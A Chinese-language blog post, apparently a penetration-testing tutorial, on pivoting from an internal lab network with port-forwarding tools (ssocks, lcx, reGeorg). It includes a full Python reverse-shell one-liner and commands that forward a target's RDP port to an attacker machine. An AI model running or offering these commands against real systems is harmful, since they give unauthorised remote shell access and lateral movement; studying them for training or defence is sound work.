---
title: 内网穿透随想
date: 2017-12-12 15:56:57
tags:
- 内网渗透
categories: 
- 渗透
---

整理整理最近碰到关于内网穿透（渗透）的一些基础知识



###  内网渗透随想  
***

![模拟](http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png)

上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外
段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali

上，现在需要Centos7做中转。
我在Centos上做端口转发

`cd /src`   
`./rcsocks -l 1088 -p 1080 -vv`

现在我将Ubuntu上执行Python的反弹shell（反弹shell命令很多，请自行搜索），

<!--more-->

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",1089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

然后kali正向连接Centos就行了

`nc 192.168.80.129 1080`  
或者  
` ./rssocks -vv -s 192.168.80.129:1080`


![西普市赛](http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png)


这个环境是我上次市赛碰到的环境，当时没有在ssocks本地编译，所以用了另一个代理工具reGeorg  
附上链接https://bbs.ichunqiu.com/thread-12514-1-1.html 
用法跟ssocks有点区别，  
![reGeorg](http://oohnuejim.bkt.clouddn.com/reGeorg.png)   
这个需要在双网卡服务器的web服务上放置一个tunnel脚本，比如php的就放置tunnel.nosocket.php，然后在本机执行正向连接到tunnel脚本的命令

python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)

### 端口转发工具
***
再来简单地介绍介绍几个端口转发工具
适合自己的才是最好的

- lcx.exe （最容易被杀软干）


反弹shell
攻击机  
`lcx.exe -listen 51 33891 把51的流量转发到33891上`

代理服务器（靶机）  

`lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389`  
把本机3389转发到攻击机的51端口上

攻击机只需远程桌面连接 127.0.0.1:33891就能连接到靶机的3389了

![远程桌面](http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png)


- Reduh、reGeorg、Tunna


用法都差不多，大同小异  
具体看   
https://bbs.ichunqiu.com/thread-12514-1-1.html    
https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg

具体介绍一个reGeorg，比如说PHP的环境，就把tunnel.nosocket.php放在一个web目录下，然后
python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)

windows 用proxifier对转发端口进行全局代理
linux 用proxychain

- ssocks


这个工具在linux用的比较多  
一些基础用法 在上面的演示中也讲到了，具体看  
http://www.freebuf.com/articles/system/12182.html
